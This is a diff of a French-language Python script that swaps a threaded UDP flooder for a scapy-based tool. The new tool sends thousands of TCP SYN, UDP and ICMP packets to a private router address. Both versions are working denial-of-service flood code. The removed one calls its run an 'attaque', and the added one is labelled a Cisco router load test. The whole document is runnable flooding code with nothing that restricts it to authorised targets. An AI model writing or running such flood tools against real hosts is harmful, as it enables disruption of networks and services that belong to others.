@@ -1,34 +1,46 @@
-import socket
-import threading
+# --------------------
+# TEST DE CHARGE ROUTEUR CISCO
+# --------------------
+
+from scapy.all import *
 import time
-import os
+from scapy.layers.inet import TCP, UDP, ICMP, IP
 
-TARGET_IP = "192.168.99.228"  # IP du routeur
-TARGET_PORT = 5000            # N'importe quel port (UDP)
-MESSAGE_SIZE = 1472           # Taille max pour rester dans MTU (1500 - 28)
-THREAD_COUNT = 10             # Nombre de threads simultanés
-DURATION = 60                 # Durée de l'attaque en secondes
+# Paramètres du test
+TARGET_IP = "192.168.99.228"  # Adresse IP du routeur Cisco
+PORT = 12345  # Port arbitraire, le routeur ne l'écoute pas forcément, on vise l'interface
+PACKETS = 10000  # Nombre total de paquets à envoyer
 
-def flood():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = os.urandom(MESSAGE_SIZE)
-    end_time = time.time() + DURATION
-    while time.time() < end_time:
-        try:
-            sock.sendto(message, (TARGET_IP, TARGET_PORT))
-        except:
-            pass
-    sock.close()
+# Fonction pour envoyer différents types de paquets vers le routeur
+def send_router_flood():
+    # Création de paquets de test
+    tcp_packet = IP(dst=TARGET_IP) / TCP(dport=PORT, flags="S") / Raw(load="ROUTER TCP FLOOD")
+    udp_packet = IP(dst=TARGET_IP) / UDP(dport=PORT) / Raw(load="ROUTER UDP FLOOD")
+    icmp_packet = IP(dst=TARGET_IP) / ICMP(type=8) / Raw(load="ROUTER ICMP FLOOD")  # Echo Request
 
-if __name__ == "__main__":
-    print(f"[+] Lancement de {THREAD_COUNT} threads de flood UDP vers {TARGET_IP}:{TARGET_PORT} pendant {DURATION}s")
-    threads = []
-    for _ in range(THREAD_COUNT):
-        t = threading.Thread(target=flood)
-        t.start()
-        threads.append(t)
+    print("🚀 Envoi de paquets vers le routeur en cours...")
 
-    for t in threads:
-        t.join()
+    packets_sent = 0
+    start_time = time.time()
 
-    print("[✓] Surcharge terminée.")
+    while packets_sent < PACKETS:
+        send(tcp_packet, count=1, verbose=False)
+        packets_sent += 1
+
+        send(udp_packet, count=1, verbose=False)
+        packets_sent += 1
+
+        send(icmp_packet, count=1, verbose=False)
+        packets_sent += 1
+
+        if packets_sent % 300 == 0:
+            print(f"Progression: {packets_sent}/{PACKETS} paquets envoyés")
+
+    total_time = time.time() - start_time
+    print(f"✅ Envoi terminé: {packets_sent} paquets envoyés en {total_time:.2f} secondes")
+    print(f"Taux d'envoi: {packets_sent / total_time:.2f} paquets/seconde")
+
+    return total_time
+
+
+send_router_flood()
